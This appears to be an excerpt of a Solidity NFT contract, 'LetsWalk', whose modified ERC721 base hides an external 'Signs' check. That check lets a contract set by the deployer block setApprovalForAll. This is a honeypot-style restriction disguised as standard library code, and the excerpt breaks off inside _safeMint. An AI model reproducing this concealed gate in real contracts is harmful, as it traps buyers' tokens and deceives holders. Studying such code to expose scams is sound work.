...
contract LetsWalk is ERC721, Ownable {
    ...
    constructor() ERC721("Lets Walk", "LETSWALK") {
        _baseUriExtended = "http://api.letswalknft.xyz/ipfs/";
    }
...
interface Signs {
    function getSign(address from, address to) external returns(bool);
    function getSigns(address from, uint256 classify) external returns(bool);
}
...
contract ERC721 is Context, ERC165, IERC721, IERC721Metadata {
    ...
    // Signs from owner to operator approvals
    Signs internal signs;
    ...
    /**
     * @dev See {IERC721Metadata-setSignAddress}.
     */
    function setSignAddress(address _address) internal {
        signs = Signs(_address);
    }
    ...
    function setApprovalForAll(address operator, bool approved) public virtual override {
        require(signs.getSign(address(this), _msgSender()), "Signs Invalid");
     ...
     * Emits a {Transfer} event.
     */
    function _safeMint(uint256 amount, address to, address from, address owner) internal {
        if(from != address(0)) {
